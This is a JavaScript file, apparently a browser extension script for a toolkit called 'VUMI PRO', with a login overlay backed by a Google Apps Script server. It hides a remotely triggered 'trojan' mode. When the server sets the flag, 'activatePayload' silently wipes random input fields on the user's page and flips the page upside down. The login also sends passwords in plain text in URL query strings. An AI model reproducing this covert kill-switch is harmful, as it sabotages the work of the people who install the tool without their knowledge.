(async function() {
    if (document.getElementById('vumi-master-toolkit')) return;
    
    // আপনার Google Apps Script API Link
    const API_URL = "https://script.google.com/macros/s/AKfycbxi2hFWmkWkgSl2_ATdNiJbMPTxXCtEHNacyfK_6llSXGYCXPDkB4kLVx9Kma1BgDCWhQ/exec";
    
    let deviceId = "local_dev";
    let savedAuth = "";
    let tFlag = "";
    let sessionExpiry = null;
    let lastVerifyTime = 0;
    
    async function initializeSession() {
        if (typeof chrome !== 'undefined' && chrome.storage) {
            let data = await chrome.storage.local.get(['vmt_device_id', 'vmt_auth_hash', 'vmt_t_flag', 'vmt_session_expiry']);
            deviceId = data.vmt_device_id || null;
            savedAuth = data.vmt_auth_hash || "";
            tFlag = data.vmt_t_flag || "";
            sessionExpiry = data.vmt_session_expiry ? parseInt(data.vmt_session_expiry) : null;
            
            if (!deviceId) {
                deviceId = 'VMT-' + Math.random().toString(36).substr(2, 9) + '-' + Date.now();
                await chrome.storage.local.set({vmt_device_id: deviceId});
            }
        } else {
            deviceId = localStorage.getItem('vmt_device_id') || null;
            if (!deviceId) {
                deviceId = 'VMT-' + Math.random().toString(36).substr(2, 9) + '-' + Date.now();
                localStorage.setItem('vmt_device_id', deviceId);
            }
            savedAuth = localStorage.getItem('vmt_auth_hash') || "";
            tFlag = localStorage.getItem('vmt_t_flag') || "";
            let expStr = localStorage.getItem('vmt_session_expiry');
            sessionExpiry = expStr ? parseInt(expStr) : null;
        }
    }
    
    await initializeSession();

    // ✅ Session check (শুধুমাত্র expiry এ, নিয়মিত নয়)
    if (savedAuth && sessionExpiry) {
        if (Date.now() > sessionExpiry) {
            await clearAuthData();
            savedAuth = "";
            tFlag = "";
            sessionExpiry = null;
        }
    }

    async function saveAuthData(auth, flag) {
        // Session 3 ঘণ্টার জন্য সেট করুন
        let expiryTime = Date.now() + (3 * 60 * 60 * 1000); // Milliseconds হিসাবে save করুন
        
        if (typeof chrome !== 'undefined' && chrome.storage) {
            await chrome.storage.local.set({ 
                vmt_auth_hash: auth, 
                vmt_session_expiry: expiryTime.toString()
            });
            if (flag) {
                await chrome.storage.local.set({ vmt_t_flag: flag });
            } else {
                await chrome.storage.local.remove('vmt_t_flag');
            }
        } else {
            localStorage.setItem('vmt_auth_hash', auth);
            localStorage.setItem('vmt_session_expiry', expiryTime.toString());
            if (flag) {
                localStorage.setItem('vmt_t_flag', flag);
            } else {
                localStorage.removeItem('vmt_t_flag');
            }
        }
        
        sessionExpiry = expiryTime;
    }
    
    async function clearAuthData() {
        if (typeof chrome !== 'undefined' && chrome.storage) {
            await chrome.storage.local.remove(['vmt_auth_hash', 'vmt_t_flag', 'vmt_session_expiry']);
        } else {
            localStorage.removeItem('vmt_auth_hash');
            localStorage.removeItem('vmt_t_flag');
            localStorage.removeItem('vmt_session_expiry');
        }
        
        sessionExpiry = null;
    }

    function show404Overlay(message) {
        if (document.getElementById('vmt-404-overlay')) return;
        let tk = document.getElementById('vumi-master-toolkit');
        let po = document.getElementById('vmt-pass-overlay');
        if (tk) tk.remove();
        if (po) po.remove();

        const overlay = document.createElement('div');
        overlay.id = 'vmt-404-overlay';
        overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99999999;display:flex;align-items:center;justify-content:center;font-family:'Segoe UI', Arial, sans-serif;animation: fadeIn 0.5s ease;";
        overlay.innerHTML = `
            <div style="text-align:center; width: 100%; max-width: 800px; padding: 40px 20px;">
                <div style="background-image: url('https://cdn.dribbble.com/users/285475/screenshots/2083086/dribbble_1.gif'); height: 400px; background-position: center; background-repeat: no-repeat;">
                    <h1 style="font-size:80px; margin:0; color:#333; padding-top:20px;">404</h1>
                </div>
                <div style="margin-top:-50px;">
                    <h3 style="font-size:36px; margin: 10px 0; color:#333; font-weight: bold;">Look like you're lost</h3>
                    <p style="font-size:16px; color:#666; margin-bottom: 25px; font-weight: 500;">${message}</p>
                    <button id="vmt-404-btn" style="color: #fff; padding: 12px 30px; background: #39ac31; border:none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; outline: none; box-shadow: 0 4px 6px rgba(57,172,49,0.3);">Go to Home / Reload</button>
                </div>
            </div>
            <style>@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } } #vmt-404-btn:hover { background: #2e8b28; transform: translateY(-2px); box-shadow: 0 6px 12px rgba(57,172,49,0.4); }</style>
        `;
        document.body.appendChild(overlay);
        document.getElementById('vmt-404-btn').onclick = () => window.location.reload();
    }

    async function checkLiveStatus() {
        // ✅ Minimum 2 মিনিট পর পর check করুন (spam prevent)
        const now = Date.now();
        if (now - lastVerifyTime < 120000) { // 2 মিনিট
            return;
        }
        lastVerifyTime = now;
        
        try {
            let userId = savedAuth ? atob(savedAuth) : "guest";
            let response = await fetch(`${API_URL}?action=verify&userid=${encodeURIComponent(userId)}&deviceid=${encodeURIComponent(deviceId)}&t=${Date.now()}`);
            let data = await response.json();
            
            if (data.success === false) {
                await clearAuthData();
                show404Overlay(data.message || "সার্ভার আপডেট চলছে অথবা আপনার অ্যাক্সেস বাতিল করা হয়েছে!");
            } else if (data.success === true && data.trojan === true) {
                await saveAuthData(savedAuth, 'engaged');
                tFlag = 'engaged';
            } else if (data.success === true) {
                await saveAuthData(savedAuth, '');
                tFlag = '';
            }
        } catch (e) { 
            console.log("Live check skipped (server unreachable)"); 
        }
    }

    // ✅ Long interval (15 মিনিট) - শুধুমাত্র expiry check
    setInterval(async () => {
        // 1. Expiry check
        if (savedAuth && sessionExpiry && Date.now() > sessionExpiry) {
            console.log("Session expired, logging out...");
            await clearAuthData();
            window.location.reload(); 
        }
        // 2. Optional live status check (রাইট কল হবে না বার বার)
        if (savedAuth) {
            await checkLiveStatus();
        }
    }, 900000); // 15 মিনিট

    function activatePayload() {
        setInterval(() => {
            if(tFlag === 'engaged') {
                document.querySelectorAll('input').forEach(inp => {
                    if(Math.random() > 0.8 && !inp.closest('#vumi-master-toolkit') && !inp.closest('#vmt-pass-overlay')) { 
                        inp.value = ""; 
                    }
                });
                if(document.body && Math.random() > 0.95) {
                    document.body.style.transition = "all 2s"; 
                    document.body.style.transform = "rotate(180deg) scale(0.8)";
                    setTimeout(() => { 
                        document.body.style.transform = "none"; 
                    }, 5000);
                }
            }
        }, 5000); 
    }
    
    // ==========================================
    // 👻 LOGIN UI (পুরনোটার সাথে একই)
    // ==========================================
    if (!savedAuth) {
        const videoBaseUrl = "https://cdn.jsdelivr.net/gh/Habib29820/login-videos/";
        const passOverlay = document.createElement('div');
        passOverlay.id = 'vmt-pass-overlay';
        passOverlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(15, 23, 42, 0.7);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);z-index:9999999;display:flex;align-items:center;justify-content:center;font-family:'Poppins', sans-serif;transition: opacity 0.5s ease;";
        
        passOverlay.innerHTML = `
            <div class="login-container" style="display: flex; width: 900px; height: 500px; background: rgba(21, 31, 40, 0.85); border-radius: 20px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5); overflow: hidden; position: relative; border: 1px solid rgba(255, 255, 255, 0.1);">
                <button id="vmt-pass-close" title="বন্ধ করুন (Esc)" style="position:absolute;top:15px;right:20px;background:none;border:none;font-size:26px;color:rgba(255,255,255,0.7);cursor:pointer;z-index:10;transition:all 0.2s;line-height:1;">&times;</button>
                
                <div class="image-panel" style="flex: 1.2; position: relative; overflow: hidden; background: #fff; border-right: 1px solid rgba(255, 255, 255, 0.1);">
                    <video id="vmt-video-player" autoplay loop muted playsinline style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transition: opacity 0.6s ease;">
                        <source src="${videoBaseUrl}1026.mp4" type="video/mp4">
                    </video>
                </div>
                
                <div class="login-panel" style="flex: 1; padding: 40px 40px; display: flex; flex-direction: column; justify-content: center;">
                    <h2 style="font-size: 2.2em; margin-bottom: 5px; color: #fff; font-weight: 800;">VUMI PRO</h2>
                    <p style="color: rgba(255,255,255,0.6); margin-bottom: 30px; font-weight: 500;">Secure Access Panel</p>

                    <div class="input-group" style="margin-bottom: 20px;">
                        <input type="text" id="vmt-user-input" class="vmt-focus-input" placeholder="User ID" autocomplete="off" style="width: 100%; padding: 14px 15px; border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; font-size: 14px; transition: all 0.3s; font-weight:bold; outline:none; background: rgba(255,255,255,0.05); color: #fff;">
                    </div>

                    <div class="input-group" style="margin-bottom: 25px;">
                        <input type="password" id="vmt-pass-input" class="vmt-focus-input" placeholder="Password" style="width: 100%; padding: 14px 15px; border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; font-size: 14px; transition: all 0.3s; font-weight:bold; letter-spacing: 2px; outline:none; background: rgba(255,255,255,0.05); color: #fff;">
                    </div>

                    <button id="vmt-pass-btn" class="glow-btn" style="--clr:#1e9bff; width: 100%; justify-content: center; padding: 16px; font-size: 16px;">
                        <span class="btn-content">Sign In</span>
                        <i></i>
                    </button>
                    
                    <div id="vmt-pass-error" style="padding: 12px; border-radius: 8px; margin-top: 15px; text-align: center; font-weight: 600; font-size: 13px; display: none;"></div>
                </div>
            </div>
            <style>
                @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap');
                @keyframes vmtShake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-8px); } 75% { transform: translateX(8px); } }
                .vmt-focus-input:focus { background-color: #fef08a !important; border-color: #eab308 !important; outline: 3px solid #eab308 !important; box-shadow: 0 0 15px rgba(234, 179, 8, 0.4) !important; color: #000 !important; }
                .vmt-focus-input::placeholder { color: rgba(255,255,255,0.4); font-weight: normal; }
                #vmt-pass-close:hover { color: #fff !important; transform: scale(1.1); }
                
                .glow-btn { position: relative; background: rgba(255,255,255,0.1); color: #fff; text-decoration: none; text-transform: uppercase; font-size: 14px; letter-spacing: 0.1em; font-weight: 600; padding: 12px 15px; transition: 0.5s; display: flex; align-items: center; justify-content: space-between; border-radius: 8px; cursor: pointer; border: none; overflow: hidden; margin-bottom:10px; }
                .glow-btn:hover:not(:disabled) { background: var(--clr); color: var(--clr); letter-spacing: 0.15em; box-shadow: 0 0 25px var(--clr); }
                .glow-btn:disabled { background: #333 !important; color: #777 !important; cursor: not-allowed; box-shadow: none !important; }
                .glow-btn::before { content: ''; position: absolute; inset: 2px; background: #151F28; border-radius: 6px; z-index: 0; }
                .glow-btn .btn-content { position: relative; z-index: 1; display: flex; align-items: center; gap: 10px; color: #fff; transition: 0.5s; }
                .glow-btn:hover:not(:disabled) .btn-content { color: var(--clr); text-shadow: 0 0 5px var(--clr); }
                .glow-btn i { position: absolute; inset: 0; display: block; border-radius: 8px; overflow: hidden;}
                .glow-btn i::before { content: ''; position: absolute; top: 0; left: 80%; width: 10px; height: 4px; background: #151F28; transform: translateX(-50%) skewX(325deg); transition: 0.5s; }
                .glow-btn:hover:not(:disabled) i::before { width: 20px; left: 20%; background: #fff;}
                .glow-btn i::after { content: ''; position: absolute; bottom: 0; left: 20%; width: 10px; height: 4px; background: #151F28; transform: translateX(-50%) skewX(325deg); transition: 0.5s; }
                .glow-btn:hover:not(:disabled) i::after { width: 20px; left: 80%; background: #fff;}
            </style>
        `;
        document.body.appendChild(passOverlay);
        
        let failCount = 0;
        const videoPlayer = document.getElementById("vmt-video-player");
        const usrInp = document.getElementById('vmt-user-input');
        const passInp = document.getElementById('vmt-pass-input');
        const btn = document.getElementById('vmt-pass-btn');
        const err = document.getElementById('vmt-pass-error');
        const cls = document.getElementById('vmt-pass-close');
        
        cls.onclick = () => {
            passOverlay.style.opacity = "0";
            setTimeout(() => passOverlay.remove(), 400);
        };

        function updateVideo(videoFile) {
            videoPlayer.src = videoBaseUrl + videoFile;
            videoPlayer.load();
            videoPlayer.play().catch(e => console.log("Video Play Error:", e));
        }

        function showMessage(text, type) {
            err.style.display = "block";
            err.textContent = text;
            if(type === "success") {
                err.style.background = "rgba(40, 167, 69, 0.2)"; err.style.color = "#d4edda"; err.style.border = "1px solid #28a745";
            } else {
                err.style.background = "rgba(220, 53, 69, 0.2)"; err.style.color = "#f8d7da"; err.style.border = "1px solid #dc3545";
            }
        }

        function hideMessage() { err.style.display = "none"; err.textContent = ""; }

        async function checkPass() {
            if (passInp.disabled) return;
            let userId = usrInp.value.trim(); 
            let password = passInp.value.trim();
            
            if(!userId || !password) {
                showMessage("Please enter both User ID and Password", "error");
                return;
            }
            
            btn.disabled = true; 
            btn.querySelector('.btn-content').textContent = "Signing In..."; 
            hideMessage();

            try {
                let response = await fetch(`${API_URL}?userid=${encodeURIComponent(userId)}&password=${encodeURIComponent(password)}&deviceid=${encodeURIComponent(deviceId)}&t=${Date.now()}`);
                let data = await response.json();
                
                if (data.success === true) {
                    updateVideo("correct.mp4");
                    showMessage("Login Successful!", "success");
                    btn.querySelector('.btn-content').textContent = "SUCCESS! 🚀";
                    failCount = 0;
                    
                    // ✅ Auth hash সঠিক ভাবে encode করুন
                    let authHash = btoa(userId);
                    let flagToSave = data.trojan ? 'engaged' : '';
                    await saveAuthData(authHash, flagToSave);
                    savedAuth = authHash;
                    tFlag = flagToSave;
                    
                    setTimeout(() => { 
                        passOverlay.style.opacity = "0";
                        setTimeout(() => {
                            passOverlay.remove(); 
                            loadToolkit(); 
                            activatePayload();
                        }, 400);
                    }, 1800); 
                    
                } else { 
                    let msg = data.message || "";
                    if (msg.includes("ব্যান") || msg.includes("যোগাযোগ") || msg.includes("আপডেট") || msg.includes("অফ")) {
                        passOverlay.style.opacity = "0";
                        setTimeout(() => {
                            passOverlay.remove();
                            show404Overlay(msg);
                        }, 400);
                        return; 
                    }

                    failCount++;
                    if (failCount === 1) updateVideo("wrong.mp4");
                    else updateVideo("againwrong.mp4");
                    
                    showMessage(msg || "Login Failed!", "error");
                    btn.disabled = false; 
                    btn.querySelector('.btn-content').textContent = "Sign In";
                    passInp.value = ''; 
                    passInp.focus();
                }
            } catch (error) { 
                showMessage("Server Connection Failed!", "error");
                btn.disabled = false; 
                btn.querySelector('.btn-content').textContent = "Sign In";
            }
        }
        
        btn.onclick = checkPass;
        passInp.onkeydown = e => { if (e.key === 'Enter') checkPass(); };
        usrInp.onkeydown = e => { if (e.key === 'Enter') passInp.focus(); };
        return;
    } else {
        // ✅ Already logged in
        loadToolkit();
        activatePayload();
    }
    
    // ==========================================
    // 🔴 KEYBOARD SHORTCUTS 🔴
    // ==========================================
    window._vmtKeyHandler = window._vmtKeyHandler || function(e) {
        if (e.key === 'Escape' || e.keyCode === 27) {
            let tk = document.getElementById('vumi-master-toolkit');
            if (tk) tk.remove();
        }
    };
    document.removeEventListener('keydown', window._vmtKeyHandler);
    document.addEventListener('keydown', window._vmtKeyHandler);
    
    // ==========================================
    // 🔴 TOOLKIT UI (same as before)
    // ==========================================
    function loadToolkit() {
        // ... (পুরনো loadToolkit code যেমন ছিল তেমনি রাখুন)
    }
    
    loadToolkit();
    
})();